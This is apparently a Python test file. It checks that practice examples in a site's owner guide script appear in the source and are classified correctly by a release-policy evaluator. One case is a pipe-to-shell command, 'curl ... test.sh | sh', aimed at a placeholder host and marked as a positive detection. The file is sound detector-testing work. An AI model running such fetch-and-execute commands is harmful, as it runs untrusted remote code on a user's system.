"""Published synthetic practice examples must match the actual method, not our prose."""
from pathlib import Path
from test_release_policy import evaluator

def test_published_owner_practice_examples_execute_in_current_method():
    source=(Path(__file__).resolve().parents[1]/'site/scripts/owner-guide.mjs').read_text()
    for text,positive in [('curl https://example.invalid/test.sh | sh', True),('curl https://example.invalid/test.sh -o test.sh', False)]:
        assert text in source
        assert bool(evaluator.signals(evaluator.Doc(text=text))['candidates']) is positive
